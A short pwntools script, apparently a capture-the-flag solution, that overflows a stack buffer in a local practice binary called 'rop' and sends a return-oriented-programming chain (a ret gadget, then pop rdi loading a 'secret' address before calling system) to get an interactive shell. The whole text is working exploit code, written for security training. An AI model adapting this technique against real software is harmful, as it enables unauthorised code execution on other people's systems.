from pwn import *

context.arch = "amd64"
context.log_level = "debug"

elf = ELF("../attachments/rop")
io = process("../attachments/rop")

pop_rdi_ret = 0x00401343
ret = 0x0040101A

payload = flat(
    [
        cyclic(0x40),
        b"A" * 8,
        ret,
        pop_rdi_ret,
        elf.sym["secret"],
        elf.sym["system"],
    ]
)
io.sendafter(b"Hello CTFer, what's your name?\n", payload)

io.interactive()
